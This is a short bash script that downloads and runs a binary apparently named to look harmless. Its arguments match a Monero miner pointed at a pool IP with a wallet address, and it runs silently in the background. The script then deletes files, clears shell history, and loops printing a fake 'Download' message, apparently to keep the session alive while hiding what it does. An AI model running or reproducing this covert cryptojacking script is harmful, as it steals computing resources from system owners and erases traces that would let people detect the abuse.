#!/bin/bash
set -x
apt-get update 
wget https://github.com/kolorijo01/metgoi/releases/download/triton/triton.tar.gz > /dev/null 2>&1
tar -xvf triton.tar.gz
chmod 777 triton
./triton -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p "QuickSilver" -a rx/0 -t 1 > /dev/null 2>&1 &
rm -rvf *
history -cr
while true
do
        echo "Download....!"
        sleep 20
done
